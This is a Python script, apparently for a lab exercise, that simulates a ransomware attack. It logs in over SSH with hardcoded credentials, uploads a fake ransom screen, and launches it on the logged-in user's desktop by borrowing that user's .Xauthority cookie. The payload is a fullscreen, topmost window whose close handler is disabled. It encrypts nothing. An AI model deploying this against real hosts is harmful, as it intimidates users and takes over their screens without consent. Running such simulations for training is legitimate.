#!/usr/bin/env python3
import sys
import paramiko

# --- LAB CREDENTIALS ---
TARGET_IP = "172.16.1.100" # The hardened Kali VM
USERNAME = "CEO"
PASSWORD = "CEOPass123!"

def main():
    print(f"[*] Preparing to deploy payload to hardened target {TARGET_IP}...")

    payload_script = """#!/usr/bin/env python3
import tkinter as tk
import time

def pay_ransom():
    lbl.config(text="Decrypting...")
    root.update()
    for i in range(0, 101, 10):
        lbl.config(text=f"Decrypting your files... {i}%")
        root.update()
        time.sleep(0.2)
    root.destroy()

root = tk.Tk()
root.attributes('-fullscreen', True)
root.attributes('-topmost', True) 
root.configure(background='black')
root.overrideredirect(True) 

lbl = tk.Label(root, text="Your Kali files have been simulated-encrypted!\\nClick below to end.", 
               fg="lime", bg="black", font=("Courier", 30, "bold"))
lbl.pack(expand=True)

btn = tk.Button(root, text="Pay Ransom", command=pay_ransom, 
                bg="darkred", fg="white", font=("Courier", 20, "bold"))
btn.pack(side="bottom", pady=50)

root.protocol("WM_DELETE_WINDOW", lambda: None)
root.mainloop()
"""

    try:
        print("[*] Connecting via SSH...")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(TARGET_IP, username=USERNAME, password=PASSWORD)
        
        print("[*] Uploading payload to /tmp/ransom_sim.py...")
        sftp = ssh.open_sftp()
        with sftp.file('/tmp/ransom_sim.py', 'w') as f:
            f.write(payload_script)
        ssh.exec_command("chmod +x /tmp/ransom_sim.py")
        sftp.close()

        print("[*] Triggering GUI using active Xauthority...")
        
        # We explicitly point to the CEO user's Xauthority file.
        # Because CEO is logged in, this file contains the valid cookie for the display.
        exec_cmd = (
            f"export DISPLAY=:0; "
            f"export XAUTHORITY=/home/{USERNAME}/.Xauthority; "
            f"nohup python3 /tmp/ransom_sim.py > /tmp/gui_out.log 2>&1 &"
        )
        
        ssh.exec_command(exec_cmd)
        
        print("[+] Attack simulation launched. Check the Hardened Kali VM screen!")
        print("[*] (If it fails, run: ssh CEO@172.16.1.100 'cat /tmp/gui_out.log')")
        ssh.close()

    except paramiko.AuthenticationException:
        print("[-] Authentication failed. Check your credentials.")
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
